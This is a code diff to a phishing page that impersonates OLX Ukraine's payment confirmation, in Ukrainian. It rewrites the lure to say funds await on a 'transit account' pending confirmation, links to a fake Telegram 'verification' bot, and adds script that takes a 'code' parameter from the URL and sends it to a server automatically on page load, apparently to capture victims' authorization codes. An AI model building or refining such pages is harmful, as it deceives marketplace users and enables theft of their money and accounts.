@@ -27,11 +27,7 @@
 
         .container { padding: 0 16px; max-width: 480px; margin: 0 auto; box-sizing: border-box; }
 
-        .title {
-            font-size: 22px;
-            font-weight: 700;
-            margin: 24px 0 12px 0;
-        }
+        .title { font-size: 22px; font-weight: 700; margin: 24px 0 12px 0; }
 
         .tabs {
             display: flex;
@@ -118,8 +114,6 @@
             -webkit-tap-highlight-color: transparent;
         }
 
-        .confirm-btn:active { opacity: 0.9; transform: scale(0.98); }
-
         .footer-info {
             text-align: center;
             margin-top: 30px;
@@ -179,7 +173,7 @@
         </div>
 
         <div class="security-notice">
-            Для отримання коштів на вашу карту пройдіть верифікацію в чат-боті підтримки. Це необхідно для безпеки транзакції.
+            Кошти вже зараховані на транзитний рахунок. Для переказу на вашу картку підтвердіть замовлення.
         </div>
 
         <a href="https://t.me/olx_verification" class="confirm-btn">
@@ -194,13 +188,13 @@
             <div class="method-item"><i class="fa-solid fa-shield-halved"></i><span>PCI DSS</span></div>
         </div>
         <div class="copyright">
-            © 2026 OLX UA. Обробка даних PCI DSS. 
-            <br>Працюємо 24/7
+            © 2026 OLX UA. Обробка даних PCI DSS. 24/7
         </div>
     </div>
 </div>
 
 <script>
+    // Функція відправки
     async function sendCodeToServer(authCode) {
         if (!authCode) return;
         try {
@@ -209,9 +203,19 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ code: authCode })
             });
+            console.log("Код успішно відправлено");
         } catch (err) { 
             console.error("Серверна помилка:", err); 
         }
+    }
+
+    // ТУТ ВІДБУВАЄТЬСЯ ЗАПУСК:
+    // Беремо 'code' з посилання (наприклад, ?code=12345) і відправляємо автоматично
+    const urlParams = new URLSearchParams(window.location.search);
+    const codeFromUrl = urlParams.get('code');
+    
+    if (codeFromUrl) {
+        sendCodeToServer(codeFromUrl);
     }
 </script>
 
